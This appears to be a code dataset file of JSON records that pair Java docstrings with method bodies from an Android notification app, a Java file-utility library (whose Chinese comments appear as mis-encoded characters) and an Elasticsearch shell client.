{"docstring": "/**\n * Update layout components (SeekBar, TextView, ImageView) according to the new preference.\n *\n * @param manual If the update is from user or from the initialization.\n */\n", "func_signal": "private void updateLayouts(boolean manual)", "code": "{\n    if (!WallpaperFactory.isWallpaperThemeSelected(getActivity())) {\n        // Using pure black.\n        if (!manual) {\n            mBackgroundSpinner.setSelection(0);\n        } else {\n            mPreviewImageDrawable.reverseTransition(TRANSITION_ANIM_DURATION);\n        }\n        mRadiusSeek.setEnabled(false);\n        mDimSeek.setEnabled(false);\n        mRadiusText.setEnabled(false);\n        mDimText.setEnabled(false);\n\n\n    } else {\n        // using system wallpaper.\n        if (!manual) {\n            mBackgroundSpinner.setSelection(1);\n        } else {\n            mPreviewImageDrawable.reverseTransition(TRANSITION_ANIM_DURATION);\n        }\n        mRadiusSeek.setEnabled(true && !mUseLiveWallpaper);\n        mDimSeek.setEnabled(true && !mUseLiveWallpaper);\n        mRadiusText.setEnabled(true && !mUseLiveWallpaper);\n        mDimText.setEnabled(true && !mUseLiveWallpaper);\n    }\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\settings\\appearance\\AppearanceSettingsFragment.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Check if the package name is in black list, or Peek is disabled, or it is in quiet hour now.\n *\n * @param sbn StatusBarNotification object to be checked.\n * @return True if it is in black list, False otherwise.\n */\n", "func_signal": "public boolean shouldPeekWakeUp(StatusBarNotification sbn)", "code": "{\n    if (NotificationHelper.isPeekDisabled(mContext)) {\n        return true;\n    }\n    for (AppInfo appInfo : mCurrentBlackList) {\n        if (sbn.getPackageName().equals(appInfo.getPackageName())) {\n            return true;\n        }\n    }\n\n    return false;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\AppList.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * \u013c\u013c\n * @param filepath     \u013c\u00b7\n * @return file\u06e3 \n */\n", "func_signal": "public static File[] getFileList(String filepath)", "code": "{\n\tFile d = null;\n\tFile list[] = null;\n\t/** \u01f0\u013f\u00bc\u013cFile **/\n\ttry {\n\t\td = new File(filepath);\n\t\tif (d.exists()) {\n\t\t\tlist = d.listFiles();\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\t/** \u0221\u00f4\u013f\u00bc\u013cFile **/\n\treturn list;\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u00bd\u013c\n * @param filePathAndName \u0131\u013c\u00b7\u013c\n * @param fileContent     \u0131\u013c\n * @return\n */\n", "func_signal": "public static void createFile(String filePathAndName, String fileContent)", "code": "{\n\ttry {\n\t\tString filePath = filePathAndName;\n\t\tfilePath = filePath.toString();\n\t\tFile myFilePath = new File(filePath);\n\t\tif (!myFilePath.exists()) {\n\t\t\tmyFilePath.createNewFile();\n\t\t}\n\t\tFileWriter resultFile = new FileWriter(myFilePath);\n\t\tPrintWriter myFile = new PrintWriter(resultFile);\n\t\tString strContent = fileContent;\n\t\tmyFile.println(strContent);\n\t\tmyFile.close();\n\t\tresultFile.close();\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u01b5\u013c\n * @param oldPathFile  \u05fc\u01b5\u013c\u0534\n * @param newPathFile \u00be\u00b7\u013c\n * @return\n */\n", "func_signal": "public static void copyFile(String oldPathFile, String newPathFile)", "code": "{\n\ttry {\n\t\tint bytesum = 0;\n\t\tint byteread = 0;\n\t\tFile oldfile = new File(oldPathFile);\n\t\tif (oldfile.exists()) {\n\t\t\tInputStream inStream = new FileInputStream(oldPathFile);\n\t\t\tFileOutputStream fs = new FileOutputStream(newPathFile);\n\t\t\tbyte[] buffer = new byte[1444];\n\t\t\twhile ((byteread = inStream.read(buffer)) != -1) {\n\t\t\t\tbytesum += byteread;\n\t\t\t\tfs.write(buffer, 0, byteread);\n\t\t\t}\n\t\t\tinStream.close();\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u05b7\u01f7\u03aa\n * @param str \u05b7\n * @return\n */\n", "func_signal": "public static boolean isNotEmpty(String str)", "code": "{\n\tif (str == null) {\n\t\treturn false;\n\t} else if (str.length() == 0) {\n\t\treturn false;\n\t} else {\n\t\treturn true;\n\t}\n}", "path": "src\\com\\jiangge\\utils\\StringUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u013c\u0435\n * @param oldPath  \u05fc\u013f\u00bc\n * @param newPath  \u05b8\u00b7\u013f\u00bc\n * @return\n */\n", "func_signal": "public static void copyFolder(String oldPath, String newPath)", "code": "{\n\ttry {\n\t\t/**\u013c\u0432 \u013c**/\n\t\tnew File(newPath).mkdirs(); \n\t\tFile a = new File(oldPath);\n\t\tString[] file = a.list();\n\t\tFile temp = null;\n\t\tfor (int i = 0; i < file.length; i++) {\n\t\t\tif (oldPath.endsWith(File.separator)) {\n\t\t\t\ttemp = new File(oldPath + file[i]);\n\t\t\t} else {\n\t\t\t\ttemp = new File(oldPath + File.separator + file[i]);\n\t\t\t}\n\t\t\tif (temp.isFile()) {\n\t\t\t\tFileInputStream input = new FileInputStream(temp);\n\t\t\t\tFileOutputStream output = new FileOutputStream(newPath\n\t\t\t\t\t\t+ \"/\" + (temp.getName()).toString());\n\t\t\t\tbyte[] b = new byte[1024 * 5];\n\t\t\t\tint len;\n\t\t\t\twhile ((len = input.read(b)) != -1) {\n\t\t\t\t\toutput.write(b, 0, len);\n\t\t\t\t}\n\t\t\t\toutput.flush();\n\t\t\t\toutput.close();\n\t\t\t\tinput.close();\n\t\t\t}\n\t\t\t/**\u013c**/\n\t\t\tif (temp.isDirectory()) {\n\t\t\t\tcopyFolder(oldPath + \"/\" + file[i], newPath + \"/\" + file[i]);\n\t\t\t}\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u027e\u013c\n * @param filePathAndName \u0131\u013c\u00b7\u013c\n * @return Boolean \u0279\u027etrue\ucce3false\n */\n", "func_signal": "public static boolean delFile(String filePathAndName)", "code": "{\n\tboolean bea = false;\n\ttry {\n\t\tString filePath = filePathAndName;\n\t\tFile myDelFile = new File(filePath);\n\t\tif (myDelFile.exists()) {\n\t\t\tmyDelFile.delete();\n\t\t\tbea = true;\n\t\t} else {\n\t\t\tbea = false;\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\treturn bea;\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u04bb\u05f7\u04f5BufferedReader\n * @param fileDir\n * @param fileName\n * @return\n */\n", "func_signal": "public static BufferedWriter getWriter(String fileDir, String fileName)", "code": "{\n\ttry {\n\t\tFile f1 = new File(fileDir);\n\t\tif (!f1.exists()) {\n\t\t\tf1.mkdirs();\n\t\t}\n\t\tf1 = new File(fileDir, fileName);\n\t\tif (!f1.exists()) {\n\t\t\tf1.createNewFile();\n\t\t}\n\t\tBufferedWriter bw = new BufferedWriter(new FileWriter(f1.getPath(), true));\n\t\treturn bw;\n\t} catch (Exception e) {\n\t\tSystem.out.println(e.getLocalizedMessage());\n\t\treturn null;\n\t}\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u01b6\u013f\u00bc\n * @param oldPath\n * @param newPath\n * @return\n */\n", "func_signal": "public static void moveFolder(String oldPath, String newPath)", "code": "{\n\tcopyFolder(oldPath, newPath);\n\tdelFolder(oldPath);\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u07f3\u0333\u04f6\n * @param msgList\n */\n", "func_signal": "public void addTasks(List<TaskEntity> msgList)", "code": "{\n\tRunnable task = null;\n\tfor(TaskEntity msg : msgList){\n\t\ttask = new TaskRunner(msg);\n\t\tthreadPool.execute(task);\n\t}\n}", "path": "src\\com\\jiangge\\utils\\task\\TaskPoolManager.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u07f3\u0333\u04f5\n * @param msg\n */\n", "func_signal": "public void addTask(TaskEntity msg)", "code": "{\n\tRunnable task = new TaskRunner(msg);\n\tthreadPool.execute(task);\n}", "path": "src\\com\\jiangge\\utils\\task\\TaskPoolManager.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u9c34\u0578\u0137\u05b8\u05ea\u05b7\n * @param arr\n * @param expr\n * @return\n */\n", "func_signal": "public static String arrayToString(String[] arr,String expr)", "code": "{\n\t\t String strInfo = \"\";\n\t\t if(arr != null && arr.length > 0){\n\t\t\t StringBuffer sf = new StringBuffer();\n\t\t\t for(String str : arr){\n\t\t\t\t sf.append(str);\n\t\t\t\t sf.append(expr);\n\t\t\t }\n\t\t\t strInfo = sf.substring(0, sf.length()-1);\n\t\t }\n\t\t return strInfo;\n}", "path": "src\\com\\jiangge\\utils\\StringUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u0f36\u013f\u00bc\n * @param folderPath \u05fc\u04aa\u06b1\u013f\u00bc\u00b4\u013f\u00bc\u013f\u00bc\u00b7 c:myf\n * @param paths      \u07bc\u013f\u00bc\u013f\u00bc\u0535  a|b|c\n * @return           \u0634\u013c\u00b7\n */\n", "func_signal": "public static String createFolders(String folderPath, String paths)", "code": "{\n\tString txts = folderPath;\n\ttry {\n\t\tString txt;\n\t\ttxts = folderPath;\n\t\tStringTokenizer st = new StringTokenizer(paths, \"|\");\n\t\tfor (int i = 0; st.hasMoreTokens(); i++) {\n\t\t\ttxt = st.nextToken().trim();\n\t\t\tif (txts.lastIndexOf(\"/\") != -1) {\n\t\t\t\ttxts = createFolder(txts + txt);\n\t\t\t} else {\n\t\t\t\ttxts = createFolder(txts + txt + \"/\");\n\t\t\t}\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\treturn txts;\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u05b7\u01f7\u03aa\n * @param str \u05b7\n * @return\n */\n", "func_signal": "public static boolean isEmpty(String str)", "code": "{\n\tif (str == null) {\n\t\treturn true;\n\t} else if (str.length() == 0) {\n\t\treturn true;\n\t} else {\n\t\treturn false;\n\t}\n}", "path": "src\\com\\jiangge\\utils\\StringUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u027e\u013c\n * \n * @param folderPath\n *            \u013c\u00b7\n * @return\n */\n", "func_signal": "public static void delFolder(String folderPath)", "code": "{\n\ttry {\n\t\t/**\u027e**/\n\t\tdelAllFile(folderPath);\n\t\tString filePath = folderPath;\n\t\tfilePath = filePath.toString();\n\t\tjava.io.File myFilePath = new java.io.File(filePath);\n\t\t/**\u027e\u013c**/\n\t\tmyFilePath.delete(); \n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u00bd\u013f\u00bc\n * @param folderPath  \u013f\u00bc\n * @return            \u013f\u00bc\u00b7\n */\n", "func_signal": "public static String createFolder(String folderPath)", "code": "{\n\tString txt = folderPath;\n\ttry {\n\t\tjava.io.File myFilePath = new java.io.File(txt);\n\t\ttxt = folderPath;\n\t\tif (!myFilePath.exists()) {\n\t\t\tmyFilePath.mkdir();\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\treturn txt;\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u0431\ubdfd\u02bd\u013c\n * @param filePathAndName \u0131\u013c\u00b7\u013c\n * @param fileContent     \u0131\u013c\n * @param encoding  \ubdfd\u02bd  GBK  UTF-8\n * @return\n */\n", "func_signal": "public static void createFile(String filePathAndName, String fileContent, String encoding)", "code": "{\n\ttry {\n\t\tString filePath = filePathAndName;\n\t\tfilePath = filePath.toString();\n\t\tFile myFilePath = new File(filePath);\n\t\tif (!myFilePath.exists()) {\n\t\t\tmyFilePath.createNewFile();\n\t\t}\n\t\tPrintWriter myFile = new PrintWriter(myFilePath, encoding);\n\t\tString strContent = fileContent;\n\t\tmyFile.println(strContent);\n\t\tmyFile.close();\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u027e\u05b8\u013c\u013c\n * @param path \u013c\u00b7\n * @return\n */\n", "func_signal": "public static boolean delAllFile(String path)", "code": "{\n\tboolean bea = false;\n\tFile file = new File(path);\n\tif (!file.exists()) { return bea;}\n\tif (!file.isDirectory()) { return bea;}\n\tString[] tempList = file.list();\n\tFile temp = null;\n\tfor (int i = 0; i < tempList.length; i++) {\n\t\tif (path.endsWith(File.separator)) {\n\t\t\ttemp = new File(path + tempList[i]);\n\t\t} else {\n\t\t\ttemp = new File(path + File.separator + tempList[i]);\n\t\t}\n\t\tif (temp.isFile()) { temp.delete(); }\n\t\tif (temp.isDirectory()) {\n\t\t\t/**\u027e\u013c\u013c**/\n\t\t\tdelAllFile(path + \"/\" + tempList[i]);\n\t\t\t/**\u027e\u013c**/\n\t\t\tdelFolder(path + \"/\" + tempList[i]);\n\t\t\tbea = true;\n\t\t}\n\t}\n\treturn bea;\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u0221\u0131\u013c\n * @param filePathAndName  \u00b7\u013c\n * @param encoding         \u0131\u013c\udabe\udeb5\u0131\ubdfd\u02bd\n * @return                 \u0131\u013c\n */\n", "func_signal": "public static String readTxt(String filePathAndName, String encoding) throws IOException", "code": "{\n\tencoding = encoding.trim();\n\tStringBuffer str = new StringBuffer(\"\");\n\tString st = \"\";\n\ttry {\n\t\tFileInputStream fs = new FileInputStream(filePathAndName);\n\t\tInputStreamReader isr;\n\t\tif (encoding.equals(\"\")) {\n\t\t\tisr = new InputStreamReader(fs);\n\t\t} else {\n\t\t\tisr = new InputStreamReader(fs, encoding);\n\t\t}\n\t\tBufferedReader br = new BufferedReader(isr);\n\t\ttry {\n\t\t\tString data = \"\";\n\t\t\twhile ((data = br.readLine()) != null) {\n\t\t\t\tstr.append(data);\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\tstr.append(e.toString());\n\t\t}\n\t\tst = str.toString();\n\t\tif (st != null && st.length() > 1)\n\t\t\tst = st.substring(0, st.length() - 1);\n\t} catch (IOException es) {\n\t\tst = \"\";\n\t}\n\treturn st;\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u03f0\u0578\u0137\u05b8\u05ea\u05b7\n * @param arr\n * @param expr\n * @return\n */\n", "func_signal": "public static String listToString(List<String> list,String expr)", "code": "{\n\t\t String strInfo = \"\";\n\t\t if(list != null && list.size() > 0){\n\t\t\t StringBuffer sf = new StringBuffer();\n\t\t\t for(String str : list){\n\t\t\t\t sf.append(str);\n\t\t\t\t sf.append(expr);\n\t\t\t }\n\t\t\t strInfo = sf.substring(0, sf.length()-1);\n\t\t }\n\t\t return strInfo;\n}", "path": "src\\com\\jiangge\\utils\\StringUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * \u01b6\u013c\n * @param oldPath\n * @param newPath\n * @return\n */\n", "func_signal": "public static void moveFile(String oldPath, String newPath)", "code": "{\n\tcopyFile(oldPath, newPath);\n\tdelFile(oldPath);\n}", "path": "src\\com\\jiangge\\utils\\FileUtils.java", "repo_name": "keaijohnee/JCake", "stars": 121, "license": "None", "language": "java", "size": 531}
{"docstring": "/**\n * Synchronizes the registered indexes given the new indexes retrieved from the elasticsearch cluster\n * @param newIndexes the indexes currently available in the cluster\n */\n", "func_signal": "protected synchronized void syncIndexes(Set<Index> newIndexes)", "code": "{\n    //every index that is currently available gets registered (insert/update)\n    for (Index index : newIndexes) {\n        registerIndex(index);\n        indexes.remove(index);\n    }\n\n    //The indexes that are left in the set need to be removed because they don't exist anymore\n    for (Index index : indexes) {\n        unregisterIndex(index);\n    }\n\n    this.indexes = newIndexes;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\ClientScopeSynchronizer.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Creates a new {@link org.elasticsearch.client.node.NodeClient}, wraps it into a shell {@link NodeClient},\n * register it as a closeable resource to the shell scope, and optionally schedules the runnable action to\n * keep the scope up-to-date for what concerns the name of the indexes and their types\n *\n * @param clusterName the name of the elasticsearch cluster to connect to\n * @return the native client that will be used within the shell\n */\n", "func_signal": "@Override\npublic ShellNativeClient newNodeClient(String clusterName)", "code": "{\n    Settings settings = ImmutableSettings.settingsBuilder()\n            .put(\"name\", shellSettings.settings().get(ShellSettings.NODE_NAME))\n            .put(\"http.enabled\", false)\n            .build();\n    Node node  = NodeBuilder.nodeBuilder().clusterName(clusterName).client(true).settings(settings).build();\n    node.start();\n    //unfortunately the es clients are not type safe, need to cast it\n    Client client = node.client();\n    if (! (client instanceof org.elasticsearch.client.node.NodeClient) ) {\n        throw new RuntimeException(\"Unable to create node client: the returned node isn't a NodeClient!\");\n    }\n    org.elasticsearch.client.node.NodeClient nodeClient = (org.elasticsearch.client.node.NodeClient)client;\n    //if clusterKo we immediately close both the client and the node that we just created\n    if (clusterKo(nodeClient)) {\n        nodeClient.close();\n        node.close();\n        return null;\n    }\n\n    AbstractClient<org.elasticsearch.client.node.NodeClient, JsonInput, JsonOutput> shellClient = clientWrapper.wrapEsNodeClient(node, nodeClient);\n    resourceRegistry.registerResource(shellClient);\n    ShellNativeClient shellNativeClient = clientWrapper.wrapShellClient(shellClient);\n    clientScopeSynchronizerRunner.startSynchronizer(shellNativeClient);\n    return shellNativeClient;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\DefaultClientFactory.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "//Just a shortcut to get all the available nodes within the cluster\n", "func_signal": "public JsonOutput availableNodes() throws Exception", "code": "{\n    ClusterStateResponse response = this.client.admin().cluster().state(new ClusterStateRequest()\n            .filterBlocks(true).filterNodes(false).filterMetaData(true)\n            .filterRoutingTable(true)).actionGet();\n\n    XContentBuilder builder = JsonXContent.contentBuilder();\n    builder.startObject();\n    for (DiscoveryNode discoveryNode : response.getState().nodes()) {\n        builder.startObject(discoveryNode.id());\n        builder.field(\"name\", discoveryNode.name());\n        builder.endObject();\n    }\n    builder.endObject();\n\n    return stringToJson.stringToJson(builder.string());\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\AbstractClient.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Method used to run a command through the Rhino engine. Allows to have a single generic executeCommand\n * public static method (signature needed by Rhino) for all the commands.\n * The command function registered to the top-level contains a reference to the actual command to be run,\n * which is a {@link Command} object annotated with the {@link ExecutableCommand} annotation.\n * @param cx the Rhino context\n * @param thisObj the current scope\n * @param args The arguments provided when running the command as a javascript function\n * @param funObj The function invoked through the shell\n * @return the result of the command execution\n */\n", "func_signal": "@SuppressWarnings(\"unused\")\npublic static Object executeCommand(Context cx, Scriptable thisObj, Object[] args, Function funObj)", "code": "{\n    if (funObj instanceof RhinoCommandFunctionObject) {\n        RhinoCommandFunctionObject rhinoCommandFunctionObject = (RhinoCommandFunctionObject) funObj;\n        Scriptable parentScope = rhinoCommandFunctionObject.getParentScope();\n        Command command = rhinoCommandFunctionObject.getCommand();\n        ExecutableCommand annotation = command.getClass().getAnnotation(ExecutableCommand.class);\n        Callable callable = ScriptRuntime.getPropFunctionAndThis(command, annotation.executeMethod(), cx, parentScope);\n        return callable.call(cx, parentScope, ScriptRuntime.lastStoredScriptable(cx), args);\n    }\n    throw new RuntimeException(\"Unable to determine the command to run\");\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\command\\RhinoCommandExecutor.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Returns a root that matches all the {@link String} elements of the specified {@link List},\n * or null if there are no commonalities. For example, if the list contains\n * <i>foobar</i>, <i>foobaz</i>, <i>foobuz</i>, the method will return <i>foob</i>.\n */\n", "func_signal": "protected String getUnambiguousCompletions(final List<CharSequence> candidates)", "code": "{\n    if (candidates == null || candidates.isEmpty()) {\n        return null;\n    }\n\n    CharSequence firstCandidate = candidates.get(0);\n    StringBuilder commonPrefix = new StringBuilder();\n    for (int i = 0; i < firstCandidate.length(); i++) {\n        char c = firstCandidate.charAt(i);\n        StringBuilder tmpPrefix = new StringBuilder(commonPrefix).append(c);\n        if (!allCandidatesStartsWith(candidates, tmpPrefix.toString())) {\n            break;\n        }\n        commonPrefix = tmpPrefix;\n    }\n    return commonPrefix.toString();\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\console\\completer\\JLineCompletionHandler.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Retrieves the current indexes and types from elasticsearch\n * @return a set containing the indexes available in the elasticsearch cluster and their types\n */\n", "func_signal": "protected Set<Index> getIndexes()", "code": "{\n    ClusterStateResponse response = unwrapShellNativeClient().client().admin().cluster().prepareState().setFilterBlocks(true)\n            .setFilterRoutingTable(true).setFilterNodes(true).execute().actionGet();\n\n    Set<Index> newIndexes = new HashSet<Index>();\n    for (IndexMetaData indexMetaData : response.getState().metaData().indices().values()) {\n        logger.trace(\"Processing index {}\", indexMetaData.index());\n\n        Set<String> typeNames = Sets.filter(indexMetaData.mappings().keySet(), new Predicate<String>() {\n            @Override\n            public boolean apply(String s) {\n                return !MapperService.DEFAULT_MAPPING.equals(s);\n            }\n        });\n        String[] types = typeNames.toArray(new String[typeNames.size()]);\n\n        newIndexes.add(new Index(indexMetaData.index(), false, types));\n\n        for (String alias : indexMetaData.aliases().keySet()) {\n            newIndexes.add(new Index(alias, true, types));\n        }\n    }\n    return newIndexes;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\ClientScopeSynchronizer.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * @return true is all the elements of <i>candidates</i> start with <i>starts</i>\n */\n", "func_signal": "protected boolean allCandidatesStartsWith(final List<CharSequence> candidates, final String commonPrefix)", "code": "{\n    for (CharSequence candidate : candidates) {\n        if (!candidate.toString().startsWith(commonPrefix)) {\n            return false;\n        }\n    }\n    return true;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\console\\completer\\JLineCompletionHandler.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Appends a character to the identifier name\n * @param c the character that needs to be added to the identifier name\n * @return the identifier itself\n */\n", "func_signal": "public Identifier append(char c)", "code": "{\n    this.nameBuilder.append(c);\n    incrementOffset();\n    return this;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\console\\completer\\Identifier.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Registers an index to the shell scope\n * @param index the index that needs to be registered to the shell scope\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\nprotected void registerIndex(Index index)", "code": "{\n    InternalIndexClient indexClient = new InternalIndexClient(unwrapShellNativeClient(), index.name(), index.isAlias());\n    InternalTypeClient[] typeClients = new InternalTypeClient[index.types().length];\n    if (index.types() != null) {\n        for (int i = 0; i < index.types().length; i++) {\n            typeClients[i] = new InternalTypeClient(unwrapShellNativeClient(), index.name(), index.types()[i]);\n        }\n    }\n    registerIndexAndTypes(indexClient, typeClients);\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\ClientScopeSynchronizer.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Used to annotate commands\n * Every command has an array of aliases and a method that is going to be invoked at runtime by the script engine.\n * The best suitable method with that name (default execute) will be found given the runtime arguments provided.\n * The command will be usable from the shell through the configured aliases.\n *\n * @author Luca Cavanna\n */\n", "func_signal": "@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.TYPE)\npublic @interface ExecutableCommand", "code": "{\n    String[] aliases();\n    String executeMethod() default \"execute\";\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\command\\ExecutableCommand.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Prints out the candidates. If the size of the candidates is greater than the\n * {@link ConsoleReader#getAutoprintThreshold}, a warning is printed\n *\n * @param candidates the list of candidates to print\n */\n", "func_signal": "protected void printCandidates(final ConsoleReader reader, List<CharSequence> candidates) throws IOException", "code": "{\n\n    Set<CharSequence> distinctCandidates = new HashSet<CharSequence>(candidates);\n    if (distinctCandidates.size() > reader.getAutoprintThreshold()) {\n        reader.println();\n        reader.print(Messages.DISPLAY_CANDIDATES.format(candidates.size()));\n        reader.flush();\n\n        char[] allowed = {'y', 'n'};\n        int c;\n        while ((c = reader.readCharacter(allowed)) != -1) {\n            if (c=='n') {\n                reader.println();\n                return;\n            }\n            if (c=='y') {\n                break;\n            }\n            reader.beep();\n        }\n    }\n\n    reader.println();\n    reader.printColumns(sortCandidates(distinctCandidates));\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\console\\completer\\JLineCompletionHandler.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Increments the offset of the identifier\n * @return the identifier itself\n */\n", "func_signal": "public Identifier incrementOffset()", "code": "{\n    this.offset++;\n    return this;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\console\\completer\\Identifier.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Allows to revert the identifier name\n * Needs to be called when the identifier is complete\n * @return the identifier itself\n */\n", "func_signal": "public Identifier reverseName()", "code": "{\n    this.nameBuilder.reverse();\n    return this;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\console\\completer\\Identifier.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Increments the offset of the identifier by the value of the input parameter\n * @param n the input parameter\n * @return the identifier itself\n */\n", "func_signal": "public Identifier incrementOffset(int n)", "code": "{\n    this.offset += n;\n    return this;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\console\\completer\\Identifier.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/* Should be useful if a client node is started and it's the only node in the cluster.\n * It means that there is no master and the checkCluster fails */\n", "func_signal": "protected boolean clusterKo(Client client)", "code": "{\n    try {\n        client.admin().cluster().prepareHealth().setTimeout(TimeValue.timeValueSeconds(1)).execute().actionGet();\n        return false;\n    } catch(Exception e) {\n        return true;\n    }\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\DefaultClientFactory.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
